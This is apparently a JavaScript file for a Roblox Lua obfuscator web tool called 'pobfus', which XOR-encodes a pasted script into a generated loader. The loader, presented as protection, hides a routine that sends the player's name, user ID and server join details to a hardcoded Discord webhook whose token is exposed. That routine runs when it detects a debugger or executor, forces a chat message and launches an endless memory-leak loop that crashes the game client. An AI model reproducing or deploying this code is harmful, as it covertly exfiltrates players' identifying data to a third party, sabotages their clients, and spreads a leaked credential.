// GitHub Loader Logic
window.addEventListener('load', () => {
    setTimeout(() => {
        document.getElementById('loader').style.opacity = '0';
        setTimeout(() => document.getElementById('loader').style.display = 'none', 500);
    }, 1800);
});

const SITE_DOMAIN = "tenringsofdoom1x.github.io"; 
const WEBHOOK = "https://discord.com/api/webhooks/1480014350755434558/lVhs2_YcG-LuG7zLjWSwBGzZPk2f1RF1fmRC5P7zZdgzJfX_fq2sdPAD81T4hOqMvfT2";

const POBFUS_ENGINE = `
return function(data, hook, key, report_name, script_identity, warn_msg)
    local decode = function(d, k)
        local r = ""
        for x = 1, #d, 2 do
            local hex = d:sub(x, x+1)
            if #hex == 2 then r = r .. string.char(bit32.bxor(tonumber(hex, 16), k)) end
        end
        return r
    end

    local function big_boom()
        local url, s_name, r_name = decode(hook, key), decode(script_identity, key), decode(report_name, key)
        local p = game:GetService("Players").LocalPlayer
        pcall(function()
            local payload = {["embeds"]={{
                ["title"]="🚨 POBFUS: LEAK DETECTED",
                ["description"]="**Project:** "..s_name.."\\n**Source:** "..r_name.."\\n**User:** "..p.Name.." ("..p.UserId..")\\n**Join:** \`game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."', p)\`",
                ["color"]=16711680,
                ["footer"]={["text"]="pobfus Support | Grok-Resistant"}
            }}}
            game:GetService("HttpService"):PostAsync(url, game:GetService("HttpService"):JSONEncode(payload))
        end)
        pcall(function() game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I have a debugger, pobfus found me") end)
        local leak = {}
        task.spawn(function() while true do for i=1,12000 do table.insert(leak, Vector3.new(i,i,i)) end task.wait() end end)
    end

    if (debug and debug.getregistry and #debug.getregistry() > 65000) or (isexecutorclosure and isexecutorclosure(loadstring)) then
        big_boom()
    else
        local s = decode(data, key)
        local f = loadstring(s)
        if f then setfenv(f, getfenv()) f() else warn(decode(warn_msg, key)) end
    end
end`;

document.getElementById('goBtn').onclick = () => {
    const raw = document.getElementById('input').value.trim();
    const sName = document.getElementById('scriptName').value.trim() || "pobfus_protected";
    if (!raw) return;

    const k = Math.floor(Math.random() * 90) + 10;
    const fold = (str) => str.split('').map(c => (c.charCodeAt(0) ^ k).toString(16).padStart(2, '0')).join('');

    let loader = `--[[ protected by pobfus | internal build ]]\n`;
    loader += `local _D = "${fold(raw)}"\n`;
    loader += `local _H = "${fold(WEBHOOK)}"\n`;
    loader += `local _K = ${k}\n`;
    loader += `local _R = "${fold(SITE_DOMAIN)}"\n`;
    loader += `local _I = "${fold(sName)}"\n`;
    loader += `local _W = "${fold("[pobfus]: Failure at " + SITE_DOMAIN)}"\n\n`; 
    loader += `local _E = [====[\n${POBFUS_ENGINE}\n]====]\n\n`;
    loader += `local s, r = pcall(loadstring(_E))\n`;
    loader += `if s and r then r()(_D, _H, _K, _R, _I, _W) end`;

    document.getElementById('output').value = loader;
    document.getElementById('dlBtn').disabled = false;
};

document.getElementById('copyBtn').onclick = () => {
    document.getElementById('output').select();
    document.execCommand('copy');
};

document.getElementById('dlBtn').onclick = () => {
    const blob = new Blob([document.getElementById('output').value], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `pobfus_output.lua`;
    a.click();
};
